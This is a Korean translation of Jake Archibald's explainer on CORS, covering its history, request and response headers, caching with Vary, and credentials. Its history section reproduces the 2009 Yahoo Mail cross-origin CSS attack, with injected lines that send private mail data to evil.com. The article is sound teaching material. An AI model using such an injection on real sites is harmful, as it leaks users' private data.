# CORS에서 이기는 방법

> 원문 : [https://jakearchibald.com/2021/cors/](https://jakearchibald.com/2021/cors/)

CORS(Cross-Origin Resource Sharing(교차 출처 리소스 공유))는 브라우저가 자원을 가져오는 방법에 대한 부분이기 때문에 어렵다. 이는 30여년 전 최초의 웹 브라우저에서 시작된 일련의 행위다. 그 이후로 기능을 추가하고, 기본 동작을 개선하고, 웹을 너무 많이 바꾸지 않는 선에서 과거의 실수를 덮어 나갔다.

어쨌든, 필자가 알고 있는 CORS에 대해서 모든 것을 적어두고 확인해볼 수 있도록 새로운 앱을 만들었다.

[The CORS playground](https://jakearchibald.com/2021/cors/playground/)

위 앱을 바로 실행시켜볼 수 있지만 이 글 곳곳에 링크를 걸어 특정 예시를 증명할 수 있도록 함께 보여줄 것이다. 

필자가 약간 앞서 나갔지만, '방법'에 설명하기 전에 CORS가 어떻게 생겨났고 여러 종류의 자원을 어떻게 적절히 가져오는지 살펴보면서 왜 CORS가 그런 것인지 설명하려고 한다. 행운을 빌어주길 바란다.

## CORS없이 다른 도메인에 접근하기

> SRC="url"이라는 필수 인수를 가진 새로운 HTML태그인 IMG를 제안한다.
[- Marc Andreessen in 1993](http://1997.webhistory.org/www.lists/www-talk.1993q1/0182.html)

브라우저는 거의 30년 동안 다른 사이트의 이미지를 포함할 수 있었다. 다른 사이트의 허락을 받을 필요 없이 그냥 할 수 있었다. 다른 사이트의 이미지뿐만 아니라 다른 자원을 가져오는 것도 가능했다.

```html
<script src="…"></script>
<link rel="stylesheet" href="…" />
<iframe src="…"></iframe>
<video src="…"></video>
<audio src="…"></audio>
```

다음과 같은 API들은 다른 웹 사이트에 요청을 하고 다른 웹 사이트의 동의 없이 각각의 방식으로 응답을 처리할 수 있다.

1994년에 이런 방식은 HTTP 쿠키의 등장으로 복잡해지기 시작했다. HTTP 쿠키는 TLS 클라이언트 인증서(서버 인증서와 혼동되지 말자)를 포함하고 HTTP 인증을 사용할 때 인증 요청 헤더에 자동으로 들어가는 상태를 포함하는 [인증 정보](https://fetch.spec.whatwg.org/#credentials) 집합의 일부가 되었다.

서버는 여러 요청을 보내더라도 그 인증 정보를 사용해서 특정 사용자의 상태 정보를 보관한다. 이런 동작은 트위터가 당신의 피드를 당신에게 보여주고 은행에서 당신 계좌를 보여주는 방식이다.

위의 방법 중 하나를 사용해서 다른 사이트의 콘텐츠를 요청하면 다른 사이트에 인증 정보가 함께 전송이 된다. 그리고 이 방법은 수년간 많은 보안 문제를 만들어 냈다.

```html
<img src="https://your-bank/your-profile/you.jpg" />
```

위 이미지가 로드가 되면 필자는 `load` 이벤트가 발생한다. 로드되지 않는다면 `error` 이벤트가 발생한다. 로그인 여부에 따라 이미지가 달라진다면 상대방의 정보를 얻을 수 있다. 또한 이미지의 높이와 너비를 읽을 수 있는데 사용자마다 차이가 있다면 더 많은 정보를 얻을 수 있다.

이런 방식은 많은 기능을 가진 CSS 같은 포맷을 이용해서 파싱 에러가 나지 않고도 상황을 더 악화시킬 수 있다. 2009년 야후 메일은 간단한 악용으로 취약하다는 점이 밝혀졌다. 공격자는 `');}`를 포함한 제목을 유저에게 보내고 나면 이후에 `{}html{background:url('//evil.com/?:`가 포함된 제목의 메일을 보낸다.

```html
…
<li class="email-subject">Hey {}html{background:url('//evil.com/?</li>
<li class="email-subject">…private data…</li>
<li class="email-subject">…private data…</li>
<li class="email-subject">…private data…</li>
<li class="email-subject">Yo ');}</li>
…
```

위 구조는 사용자의 개인 데이터가 유효한 CSS구문 분석 대상 사이에 끼어 있다. 그런 다음 공격자는 사용자가 다음을 포함하는 페이지를 방문하도록 유도한다.

```html
<link rel="stylesheet" href="https://m.yahoo.com/mail" />
```

해당 자원이 `yahoo.com`의 쿠키를 이용해 로드되면 CSS 파서는 미리 심어두었던 메일 제목을 구문 분석하여 개인 정보를 `evil.com`에 보내게 된다. 이럼 안된다.

이것은 빙산의 일각에 불과하다 [브라우저 버그](https://jakearchibald.com/2018/i-discovered-a-browser-bug/)에서 [CPU 악용사례](https://en.wikipedia.org/wiki/Meltdown_(security_vulnerability))에 이르기까지 개인 정보를 유출시키는 이런 자원들은 수십년간 문제를 발생 시켜왔다.

## 잠그기

위의 내용이 웹 디자인 상의 실수였음이 분명해졌기 때문에, 이제 더 이상 앞선 요청을 처리할 수 있는 API를 만들지 않는다. 그럼 과 동시에, 지난 수십 년간 최선을 다해 문제를 해결해왔다.

* 다른 출처(이것에 대한 설명은 잠시 후에 설명하겠다)의 CSS는 이제 CSS `Content-Type`과 함께 전송해야 한다. 안타깝게도 [쿼크 모드](https://en.wikipedia.org/wiki/Quirks_mode) 페이지에서는 웹의 상당 부분을 손상시키지 않고는 스크립트 및 이미지, CSS를 강제로 적용할 수 없었다. 
* [X-Content-Type-Options: nosniff 헤더](https://fetch.spec.whatwg.org/#x-content-type-options-header)를 사용해서 서버에게 "올바른 `Content-Type`을 보내지 않는 한 CSS 또는 JS로 구문을 분석하지 마"라고 말할 수 있다. 
* 나중에 다른 출처에서 오는 HTML, JSON, XML(SVG 제외)와 같은 no-CORS 응답 유형도 보호하기 위해 `nosniff` 규칙이 확장되었다. 이런 보호를 [CORB](https://fetch.spec.whatwg.org/#corb)라고 부른다. 
* 최근에는 사이트 B가 [SameSite 쿠키 속성](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite)을 사용해서 쿠키의 전송 여부를 설정하지 않는 한 사이트 A에서 사이트 B로 요청과 함께 쿠키를 보내지 않는다. 쿠키가 없으면 사이트는 일반적으로 개인 데이터가 없는 '로그아웃'된 뷰를 보여주게 된다. 
* Firefox와 Safari는 한 단계 더 나아가 사이트를 완전히 격리하려고 노력하지만, 현재 두 브라우저 간의 작동 방식은 상당히 다르다.

### 동일 출처 정책

1995년, 넷스케이프 2는 라이브 스크립트와 HTML 프레임이라는 두 가지 놀라운 새로운 기능을 선보였다. 프레임을 사용하면 한 페이지를 다른 페이지에 삽입할 수 있으며, 라이브 스크립트는 두 페이지와 상호 작용할 수 있다.

넷스케이프는 이 기능이 보안 문제를 유발할 수 있다는걸 깨달았다. 은행 페이지의 DOM을 읽는 페이지를 원하는 사람은 없기 때문에, 넷스케이프는 두 페이지가 *동일한 출처(origin)*를 가지고 있을 경우에만 크로스 프레임 스크립팅이 허용하기로 결정했다.

```
https://jakearchibald.com:443/2021/blah/?foo#bar
|                            |
----------The origin----------
```

이 아이디어는 같은 출처의 사이트인 경우 소유자가 같을 가능성이 높다는 취지였다. 다 그렇다는 것은 아니지만 많은 사이트들이 `http://example.com/~jakearchbald/`와 같은 URL로 콘텐츠를 나누기 때문에 다음과 같은 기준을 만들어야 했다. 

그 시점부터, 보장받은 리소스 기능들은 동일 출처로 제한되었다. 여기에는 `new ActiveXObject('Microsoft.XMLHTTP')`가 포함되었다. 1999년 IE5에 처음 등장했으며 나중에 웹 표준 `XMLHttpRequest`가 되었다.


### Origins(출처) vs sites(사이트)

일부 웹 기능들은 출처를 다루지 않고 '사이트'를 다룬다. 예를 들면 `https://help.yourbank.com`와 `https://profile.yourbank.com`는 다른 출처를 가진다. 하지만 사이트는 같다. `yourbank.com`의 모든 하위 도메인으로 전송되는 쿠키를 만들 수 있으므로 쿠키들은 사이트 레벨에서 동작하는 일반적인 기능이다.

하지만 브라우저는 `https://help.yourbank.com`과 `https://profile.yourbank.com`이 같은 사이트의 일부라고 알고, `https://yourbank.co.uk`와 `https://jakearchibald.co.uk`는 어떻게 다른 사이트라고 알 수 있을까? 필자 말은...이 주소들은 모두 점으로 분리된 세 부분을 가지고 있다는 것이다.

정답은 각 브라우저에 있는 휴리스틱(역자 주: 경험에 기반하여 문제를 해결)의 집합이다. 2007년 모질라는 그들의 휴리스틱을 목록으로 바꾸었다. 이 목록은 현재 [공개 접미사 목록](https://publicsuffix.org/)으로 알려진 별도의 커뮤니티 프로젝트로 유지 관리되며 모든 브라우저와 다른 많은 프로젝트에서 사용된다.

만약 누군가가 UI 힌트 없이 URL의 보안 의미를 이해한다고 말한다면 9000개 이상의 공개 접미사 목록을 암기하고 있는지 확인해보자.

> 역자 주 : https://jakearchibald.com/2021/cors/ 원작자 글 중간 부분에서 URL을 적으면 실제로 Origin과 Site를 확인할 수 있고 서로 다른 URL이 같은 출처인지 같은 site인지도 확인할 수 있다.

따라서 `https://app.jakearchibald.com`와 `https://other-app.jakearchibald.com`는 같은 사이트의 일부이지만 `https://app.glitch.me`와 `https://other-app.glitch.me`는 다른 사이트이다. `glitch.me`은 공개 접미사 목록에 있는 반면, `jakearchibald.com`는 없기 때문이다. 다른 사람들이 `glitch.me`의 서브도메인을 '소유'하는 반면, 필자는 `jakearchibald.com`의 모든 서브도메인을 소유하기 때문에 이것은 틀린 것이 아니다.

## 다시 열기

좋다. 다른 원본의 리소스에 액세스 할 수 있는 `<img>`와 같은 API가 있지만 응답으로 할 수 있는 것은 제한적이다.(하지만 지금 생각해보니 제한적이지 않은것 같다) 그리고 우리는 동일 출처에서만 작동하는 프레임간 스크립팅(cross-frame scripting)과 `XMLHtpRequest`와 같은 보다 강력한 API가 있다.

어떻게 하면 이런 강력한 API가 *교차 출처*에서 작동하도록 할 수 있을까?

### 자격증명 제거?

자격 증명 없이 요청이 전송되도록 옵트인을 제공한다고 가정하자. 이에 대한 대응은 '로그아웃' 뷰가 될 것이므로 사적인 데이터는 전혀 담기지 않고, 걱정 없이 공개될 수 있을 것이다.

불행히도 브라우저 자격 증명 이외의 것을 사용하여 자체적으로 '보안'하는 HTTP 엔드포인트가 많이 있다. 

많은 회사 인트라넷은 특정 네트워크에서만 액세스 할 수 있기 때문에 '비공개'로 간주된다. 일부 라우터 및 IoT 장치는 홈 네트워크('IoT'의 's'는 보안을 의미한다)로 제한되기 때문에 선의를 가진 사람만 액세스 할 수 있다고 가정한다. 일부 웹사이트는 접속하는 IP 주소에 따라 다른 콘텐츠를 제공한다. 

그러면, 만약 당신의 집에서 필자의 웹사이트를 방문한다고 가정하면 일반적인 호스트 이름과 IP 주소에 대한 요청을 시작한다. 브라우저 자격 증명 없이 안전하지 않은 IoT 장치를 찾고 기본 암호를 사용하는 라우터를 찾는 것은 당신의 삶을 비참하게 만들 수 있다. 

자격 증명을 제거하는 것도 해결책의 일부이지만 그것만으로는 충분하지 않다. 리소스에 개인 데이터가 포함되어 있는지 알 방법이 없으므로 리소스가 "이봐, 괜찮아, 다른 사이트에서 내 콘텐츠를 읽도록 해"라고 선언할 수 있는 방법이 필요하다.

### 별도의 리소스 옵트인?

원본 출처에서는 교차 출처 접근에 대한 권한을 담고 있는 특별한 리소스를 가질 수 있다. 그것이 바로 [플래시가 사용한 보안 모델](https://www.adobe.com/devnet-docs/acrobatetk/tools/AppSec/xdomain.html)이다. 플래시는 사이트 루트에서 다음과 같이 생긴 `/crossdomain.xml`을 찾는다.

```xml
<?xml version="1.0"?>
<!DOCTYPE cross-domain-policy SYSTEM "https://www.adobe.com/xml/dtds/cross-domain-policy.dtd">
<cross-domain-policy>
  <site-control permitted-cross-domain-policies="master-only" />
  <allow-access-from domain="*.example.com" />
  <allow-access-from domain="www.example.com" />
  <allow-http-request-headers-from domain="*.adobe.com" headers="SOAPAction" />
</cross-domain-policy>
```

하지만 몇 가지 문제가 있다.

* 그것은 전체 출처에 대한 행동을 바꾼다. 특정 리소스 규칙을 지정할 수 있는 유사한 형식을 떠올릴 수 있지만 `/crossdomain.xml` 리소스가 상당히 커지기 시작한다.
* `/crossdomain.xml`에 대한 요청과 실제 리소스에 대한 요청의 두 가지 요청이 발생한다. 이 문제는 `/crossdomain.xml`이 커질수록 더 큰 문제가 된다.
* 여러 팀이 구축한 대규모 사이트의 경우 `/crossdomain.xml`의 소유권 문제가 발생한다.

### 리소스 내 옵트인?

요청 횟수를 줄이기 위해서 리소스 자체 내에 권한에 관한 옵트인을 둘 수 있다. 이 기술은 2005년 W3C Voice Browser Working Group에서 XML 프로세싱 명령어를 사용하여 제안했다.

```
<?access-control allow="*.example.com" deny="*.visitors.example.com"?>
```

그러나 자원이 XML이 아니라면 어떻게 해야할까? 그렇다면, 옵트인을 정의할 다른 포맷이 필요할 것이다.

이것은 프레임 대 프레임 통신을 위한 목표이다. 양쪽 모두 [postMessage](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)를 사용하여 참여하며, 서로 소통하고 싶은 발신지를 선언할 수 있다. 

하지만 리소스의 원시 바이트에 액세스 하는 것은 어떨까? 이러한 경우 옵트인을 위해 리소스 별 메타데이터를 사용하는 것은 의미가 없다. 또한 HTTP는 이미 리소스 메타데이터를 위한 공간을 확보하고 있다.

### HTTP 헤더 옵트인

Voice Browser Working Group의 제안은 HTTP 헤더를 사용하여 일반화되었으며 Cross-Origin Resource Sharing(교차 출처 리소스 공유) 또는 CORS가 되었다.

```
Access-Control-Allow-Origin: *
```

## CORS 요청하기

`fetch()`와 같은 대부분의 최신 웹 기능은 기본적으로 CORS가 필요하다. 단, `<link rel="preload">`와 같이 CORS를 사용하지 않는 이전 기능을 지원하도록 설계된 최신 기능은 예외다.

불행하게도 CORS를 필요로 하는 지 그렇지 않은지 구분하는 쉬운 방법은 없다. 다음 예제를 보자.

```html
<!-- CORS 요청이 아님 -->
<script src="https://example.com/script.js"></script>
<!-- CORS 요청 -->
<script type="module" src="https://example.com/script.js"></script>
```

가장 좋은 방법은 우선 시도해 본 뒤, 네트워크 DevTools를 살펴보는 것이다. Chrome과 Firefox에서 교차 출처 요청은 [Sec-Fetch-Mode 헤더](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Sec-Fetch-Mode)와 함께 전송되어 CORS 요청인지 여부를 알려준다. 유감스럽게도 사파리는 아직 이것을 지원하지 않는다.

[CORS playground에서 실행해 보자](https://jakearchibald.com/2021/cors/playground/?prefillForm=1&requestMethod=GET&requestUseCORS=1&requestSendCredentials=&preflightStatus=206&preflightAllowOrigin=&preflightAllowCredentials=&preflightAllowMethods=&preflightAllowHeaders=&responseAllowOrigin=*&responseAllowCredentials=&responseExposeHeaders=)

위 예제에서 우리가 요청을 보내면, 화면에 서버가 수신한 헤더가 기록된다. Chrome 또는 Firefox를 사용하는 경우 `Sec-Fetch-Mode`가 다른 `Sec-` 헤더와 함께 `cors`로 설정된 것을 볼 수 있다. 그러나 [no-CORS를 요청](https://jakearchibald.com/2021/cors/playground/?prefillForm=1&requestMethod=GET&requestUseCORS=&requestSendCredentials=&preflightStatus=206&preflightAllowOrigin=&preflightAllowCredentials=&preflightAllowMethods=&preflightAllowHeaders=&responseAllowOrigin=&responseAllowCredentials=&responseExposeHeaders=)하면 `Sec-Fetch-Mode`는 `no-cors`가 된다.

HTML 요소로 인해 no-CORS 가져오기가 발생하는 경우 `crossorigin` 속성을 사용하여 CORS 요청으로 전환할 수 있다.

```html
<img crossorigin src="…" />
<script crossorigin src="…"></script>
<link crossorigin rel="stylesheet" href="…" />
<link crossorigin rel="preload" as="font" href="…" />
```
이러한 항목을 CORS로 전환하면 교차 출처 리소스를 가지고 더 많은 것을 할 수 있다.

* `<img>`를 `<canvas>`에 칠하고 나서 픽셀을 읽을 수 있다.
* [간혹 겪게되는 이상한 경우 에도](https://github.com/whatwg/html/issues/2440) 스크립트에 대한 더 자세한 스택 추적을 할 수 있다.
* [하위 리소스 무결성](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity#subresource_integrity_with_the_%3Cscript%3E_element)과 같은 추가 기능을 사용할 수 있다.
* [link.sheet](https://developer.mozilla.org/en-US/docs/Web/API/CSSStyleSheet)를 통해 구문 분석된 스타일시트를 탐색할 수 있다.

`<link rel="preload">`의 경우, 최종 요청에서도 CORS를 사용하는 경우 CORS를 사용하는지 확인해야 한다. 그렇지 않고 사전 로드 캐시에서 일치하지 않으면 결국 두 번의 요청이 발생한다.

## CORS 요청

일반적으로 교차 출처 CORS 요청은 자격 증명 없이 이뤄진다. 따라서 쿠키, 클라이언트 인증서, 자동 `인증(Authorization)` 헤더와 응답에 대한 `Set-Cookie`가 무시된다. 그러나 동일 출처 요청에는 자격 증명이 포함된다. 

CORS가 개발될 무렵, 브라우저 확장 프로그램과 '인터넷 보안' 소프트웨어에 의해 [Referer](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer) 헤더가 자주 스푸핑 되거나 제거되었기 때문에 요청을 한 페이지의 출처를 제공하는 [Origin](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Origin)이라는 새로운 헤더가 만들어졌다. 

`Origin`은 일반적으로 유용하기 때문에 웹소켓이나 `POST` 요청과 같은 많은 다른 유형의 요청에 추가되었다. 브라우저 제공사는 일반 `GET` 요청에도 추가하려고 했지만 `Origin`헤더의 존재가 CORS 요청을 의미한다고 가정하는 사이트들이 언젠가는 손상될 수 있어서 하지 않았다.😬

[CORS playground에서 실행해 보자](https://jakearchibald.com/2021/cors/playground/?prefillForm=1&requestMethod=GET&requestUseCORS=1&requestSendCredentials=&preflightStatus=206&preflightAllowOrigin=&preflightAllowCredentials=&preflightAllowMethods=&preflightAllowHeaders=&responseAllowOrigin=*&responseAllowCredentials=&responseExposeHeaders=)

 요청할 때 서버가 수신한 헤더를 `Origin` 포함해서 기록한다. [no-CORS GET 요청](https://jakearchibald.com/2021/cors/playground/?prefillForm=1&requestMethod=GET&requestUseCORS=&requestSendCredentials=&preflightStatus=206&preflightAllowOrigin=&preflightAllowCredentials=&preflightAllowMethods=&preflightAllowHeaders=&responseAllowOrigin=&responseAllowCredentials=&responseExposeHeaders=)을 하면 `Origin` 헤더가 전송되지 않지만 [no-CORS POST 요청](https://jakearchibald.com/2021/cors/playground/?prefillForm=1&requestMethod=POST&requestUseCORS=&requestSendCredentials=&preflightStatus=206&preflightAllowOrigin=&preflightAllowCredentials=&preflightAllowMethods=&preflightAllowHeaders=&responseStatus=200&responseAllowOrigin=&responseAllowCredentials=&responseExposeHeaders=)을 하면 다시 표시된다.

 ## CORS 응답

CORS 검사를 통과하고 다른 출처에게 응답에 대한 액세스 권한을 부여하려면 응답에 다음 헤더가 포함되어야 한다.

```
Access-Control-Allow-Origin: *
```

`*`은 요청의 `Origin` 헤더 값으로 변경된다. 대신 `*`은 모든 요청이 자격 증명 없이 전송될 경우 모든 요청 출처에서 작동한다. 모든 헤더와 마찬가지로 헤더 이름은 대소문자를 구분하지 않지만 값은 대소문자를 구분한다.

해당 헤더에 다음 값으로 CORS playground에서 실행해봐라!

* [*](https://jakearchibald.com/2021/cors/playground/?prefillForm=1&requestMethod=GET&requestUseCORS=1&requestSendCredentials=&preflightStatus=206&preflightAllowOrigin=&preflightAllowCredentials=&preflightAllowMethods=&preflightAllowHeaders=&responseAllowOrigin=*&responseAllowCredentials=&responseExposeHeaders=)
* [https://jakearchibald.com](https://jakearchibald.com/2021/cors/playground/?prefillForm=1&requestMethod=GET&requestUseCORS=1&requestSendCredentials=&preflightStatus=206&preflightAllowOrigin=&preflightAllowCredentials=&preflightAllowMethods=&preflightAllowHeaders=&responseStatus=200&responseAllowOrigin=https%3A%2F%2Fjakearchibald.com&responseAllowCredentials=&responseExposeHeaders=)

반면, 허용되는 값은 `*`와 요청의 `Origin` 헤더의 정확한 대소문자를 구분하는 값뿐이므로 다음은 작동하지 않는다.

* [https://jakearchibald.com/](https://jakearchibald.com/2021/cors/playground/?prefillForm=1&requestMethod=GET&requestUseCORS=1&requestSendCredentials=&preflightStatus=206&preflightAllowOrigin=&preflightAllowCredentials=&preflightAllowMethods=&preflightAllowHeaders=&responseAllowOrigin=https%3A%2F%2Fjakearchibald.com%2F&responseAllowCredentials=&responseExposeHeaders=) - 끝에 `/`는 `Origin` 헤더와 일치하지 않는다.
* [https://JakeArchibald.com](https://jakearchibald.com/2021/cors/playground/?prefillForm=1&requestMethod=GET&requestUseCORS=1&requestSendCredentials=&preflightStatus=206&preflightAllowOrigin=&preflightAllowCredentials=&preflightAllowMethods=&preflightAllowHeaders=&responseAllowOrigin=https%3A%2F%2FJAKEarchibald.com&responseAllowCredentials=&responseExposeHeaders=) - `Origin` 헤더와 대소문자가 일치하지 않는다.
* [https://jakearchibald.*](https://jakearchibald.com/2021/cors/playground/?prefillForm=1&requestMethod=GET&requestUseCORS=1&requestSendCredentials=&preflightStatus=206&preflightAllowOrigin=&preflightAllowCredentials=&preflightAllowMethods=&preflightAllowHeaders=&responseAllowOrigin=https%3A%2F%2Fjakearchibald.*&responseAllowCredentials=&responseExposeHeaders=) - 와일드카드는 여기에 작성할 수 없다.
* [https://jakearchibald.com, https://example.com](https://jakearchibald.com/2021/cors/playground/?prefillForm=1&requestMethod=GET&requestUseCORS=1&requestSendCredentials=&preflightStatus=206&preflightAllowOrigin=&preflightAllowCredentials=&preflightAllowMethods=&preflightAllowHeaders=&responseAllowOrigin=https%3A%2F%2Fjakearchibald.com%2C+https%3A%2F%2Fexample.com&responseAllowCredentials=&responseExposeHeaders=) - 오직 하나의 값만 쓸 수 있다.

유효한 값은 다른 출처에게 응답 값과 다음 헤더의 하위 집합에 대한 액세스 권한을 제공한다.

* `Cache-Control`
* `Content-Language`
* `Content-Type`
* `Expires`
* `Last-Modified`
* `Pragma`

응답에는 다른 헤더인 `Access-Control-Expose-Headers`가 포함되어 추가 헤더를 표시할 수 있다.

```
Access-Control-Expose-Headers: Custom-Header-1, Custom-Header-2
```

헤더 이름은 대소문자를 구분하지 않는다. 또한 다음을 사용할 수 있다.

```
Access-Control-Expose-Headers: *
```

위 값은 자격 증명 없이 요청하는 경우 응답에 모든 헤더를 노출(표시)한다. 

하지만 응답에 `Set-Cookie` 및 `Set-Cookie2` 헤더(더 이상 사용되지 않는 Set-Cookie에 대한 실패에 대한 후속 조치 헤더)는 사이트 간 쿠키 노출을 방지하기 위해 노출되지 않는다. 

CORS playground에서 실행해 보자.

* [일정 부분만 헤더 노출 하는 경우](https://jakearchibald.com/2021/cors/playground/?prefillForm=1&requestMethod=GET&requestUseCORS=1&requestSendCredentials=&preflightStatus=206&preflightAllowOrigin=&preflightAllowCredentials=&preflightAllowMethods=&preflightAllowHeaders=&responseStatus=200&responseAllowOrigin=*&responseAllowCredentials=&responseExposeHeaders=foo%2C+date)
* [모든 헤더 노출 하는 경우](https://jakearchibald.com/2021/cors/playground/?prefillForm=1&requestMethod=GET&requestUseCORS=1&requestSendCredentials=&preflightStatus=206&preflightAllowOrigin=&preflightAllowCredentials=&preflightAllowMethods=&preflightAllowHeaders=&responseAllowOrigin=*&responseAllowCredentials=&responseExposeHeaders=*)

## CORS와 캐싱

CORS 요청도 캐싱이 된다. Firefox는 요청에 자격 증명이 있는지 여부에 따라 HTTP 캐시를 분할(Chrome도 동일한 작업을 수행할 계획이다.)하지만 CDN 캐시는 여전히 걱정해야 한다.

### 긴 캐시 리소스에 CORS 추가

캐시 수명이 긴 리소스이 있는 경우 콘텐츠가 변경될 때 파일 이름을 변경하는 데 익숙할 것이다. 그래서 사용자는 새 콘텐츠를 선택한다. 헤더 변경에 대해서도 마찬가지이다. 

캐시 수명이 긴 리소스에 `Access-Control-Allow-Origin: *`을 추가할 경우, 헤더 없이 캐시 된 버전을 재사용하지 않고 클라이언트가 서버의 새 헤더를 가져오도록 URL을 변경해야 한다. 

만약 시간이 충분하다면 [장기 캐싱을 자세히 다룬 글](https://jakearchibald.com/2016/caching-best-practices/)에서 자세하게 다루고 있으니 읽어보길 바란다.

### 조건부 CORS 헤더 전달

쿠키와 함께 요청을 받으면 리소스에 개인 데이터가 포함되어 있지만 쿠키가 없어도 되는 데이터만 노출하려면, 요청에 `Cookie` 헤더가 없는 경우에만 응답에 `Access-Control-Allow-Origin: *` 헤더를 포함하는 것이 좋다. 이렇게 하면 CDN 또는 브라우저 캐시가 개인 데이터를 포함하는 응답을 재사용하는 의도치 않은 상황을 방지할 수 있다.

1. 브라우저가 CORS 없이 리소스를 가져오므로 요청에 쿠키가 포함된다.
2. 개인 데이터를 포함하는 응답은 캐시로 들어간다.
3. 브라우저는 동일한 리소스에 대한 CORS 요청을 하고 쿠키를 포함하지 않는다.
4. 캐시가 이전과 동일한 응답을 반환한다.

이 경우 브라우저는 두 번째 요청에서 쿠키를 보내지 않았지만 이전 요청과 함께 보낸 일부 쿠키로 인해 개인 데이터가 포함된 응답을 받는다. 개인정보를 드러내면서까지 CORS 검사를 통과하는것을 원치 않을 것이다.

그러나 위의 '버그'는 중요한 다음 헤더가 누락된 경우에만 발생한다.

```
Vary: Cookie
```

즉, "`Cookie` 헤더의 상태가 원래 요청과 일치하는 경우에만 캐시 된 버전의 서비스를 제공할 수 있다."의 의미이다. 요청에 `Cookie` 헤더가 있는지 여부에 관계없이 URL에 대한 모든 응답에 해당 헤더를 포함해야 한다.

또한 일부 서비스는 `Origin` 헤더의 존재를 대략적인 신호로 사용하여 요청이 CORS 요청처럼 보이는지 여부에 따라 조건부로 `Access-Control-Allow-Origin: *`를 추가하는 것을 보았다. 이 작업은 불필요하게 복잡하다. 만약 여러분이 이 방식을 택하기로 결정했다면, 올바른 Vary 헤더를 사용해야 한다는것을 잊지말자.

```
Vary: Origin
```

**여러 인기 있는 “클라우드 스토리지” 호스트가 이런 잘못을 하고 있다.** 호스트들은 조건부로 CORS 헤더를 추가하지만 `Vary` 헤더는 포함하지 않는다. 헤더의 디폴트 값을 믿지 말고, 실제로 올바르게 동작하고 있는지 확인해야 한다. 

`Vary`는 조건으로 사용할 많은 헤더를 나열할 수 있으므로, `Origin` 및 `Cookie` 헤더의 존재에 따라 `Access-Control-Allow-Origin: *`을 추가할 경우 다음을 사용할 수 있다.

```
Vary: Origin, Cookie
```

## CORS를 통해 자원을 노출해도 안전한가?

리소스에 개인 데이터가 포함되어 있지 않으면 `Access-Control-Allow-Origin: *`를 추가하는 것이 안전하다. 어서 추가하도록 하자!

리소스에 쿠키에 따라 개인 데이터가 포함되어 있는 경우도 있는 경우 `Vary: Cookie` 헤더도 포함되어 있으면 `Access-Control-Allow-Origin: *`를 추가하는 것이 안전하다.

마지막으로 데이터 보안에 있어 발신자의 IP 주소나, '내부' 네트워크로 제한되어 있는 서버라고 가정하는 경우에는 `Access-Control-Allow-Origin: *`를 사용하는 것이 전혀 안전하지 않다. 게다가, *제발 그러지 말자!* 그 데이터는 실제로 안전하지 않다. 플랫폼 앱은 그 데이터를 입수하여 그들이 원하는 곳으로 보낼 수 있을 것이다.

## 자격증명을 추가하다

교차 출처인 CORS 요청은 기본적으로 자격 증명 없이 이루어진다. 그러나 다양한 API를 통해 자격 증명을 다시 추가할 수 있다.

fetch API를 사용하면 다음과 같다.

```js
const response = await fetch(url, {
  credentials: 'include',
});
```

또는 HTML 요소에서는 다음과 같이 추가할 수 있다.

```html
<img crossorigin="use-credentials" src="…" />
```

하지만, 이 방법은 더 강한 옵트인을 만든다. 따라서 응답에는 반드시 다음이 포함되어야 한다.

```
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: https://jakearchibald.com
Vary: Cookie, Origin
```

CORS 요청에 자격 증명이 포함된 경우 응답에 `Access-Control-Allow-Credentials: true` 헤더가 포함되어야 하며 액세스 `Access-Control-Allow-Origin` 값은 요청의 `Origin` 헤더(요청에 자격 증명이 있는 경우 `*` 는 허용되지 않는 값)로 반영해야 한다. 

개인 데이터를 노출하는 것은 위험하기 때문에 이 옵트인은 강력하다. 그리고 당신이 정말로 신뢰하는 출처에서만 이루어져야 한다. 

Firefox와 Safari에서 볼 수 있는 격리처럼 쿠키에 대한 same-site(동일한 사이트) 규칙이 여전히 적용된다. 하지만 이러한 것들은 cross-origin(교차 출처)가 아닌 cross-site(교차 사이트)에서만 효력을 발휘한다. 

응답을 캐시 할 수 있는 경우 `Vary` 헤더를 사용하는 것이 중요하다. 그리고 브라우저뿐만 아니라 CDN 같은 중간적인 것들도 마찬가지이다. `Vary`를 사용하여 브라우저 및 중간자에게 특정 요청 헤더에 따라 응답이 다르다는 것을 알린다. 그렇지 않으면 사용자가 잘못된 `Access-Control-Allow-Origin` 값을 가진 응답을 받게 될 수 있다.

[CORS playground에서 실행해 보자](https://jakearchibald.com/2021/cors/playground/?prefillForm=1&requestMethod=GET&requestUseCORS=1&requestSendCredentials=1&preflightStatus=206&preflightAllowOrigin=&preflightAllowCredentials=&preflightAllowMethods=&preflightAllowHeaders=&responseAllowOrigin=https%3A%2F%2Fjakearchibald.com&responseAllowCredentials=true&responseExposeHeaders=&responseCookieName=hello&responseCookieValue=world) 이 요청은 모든 기준을 충족하며 쿠키도 설정한다. 두 번째 요청을 하면 쿠키가 반환되는 것을 볼 수 있다.

## 일반적이지 않은 요청과 사전검토

지금까지, 응답은 데이터를 노출할지 말지를 선택해왔다. 모든 *요청*은 안전한 것으로 가정했다. 왜냐하면 요청은 특별한 일을 하고 있지 않기 때문이다.

```js
fetch(url, { credentials: 'include' });
```

위의 내용은 특이할 것이 없는데, 그 이유는 요청이 이미 `<img>`가 할 수 있는 것과 매우 유사하기 때문이다.

```js
fetch(url, {
  method: 'POST',
  body: formData,
});
```

위의 내용도 특이한 점이 없는데, 왜냐하면 요청은 이미 `<form>`이 할 수 있는 것과 매우 유사하기 때문이다.

```js
fetch(url, {
  method: 'wibbley-wobbley',
  credentials: 'include',
  headers: {
    fancy: 'headers',
    'here-we': 'go',
  },
});
```

위 내용은 충분히 일반적이지 않은 요청이다.

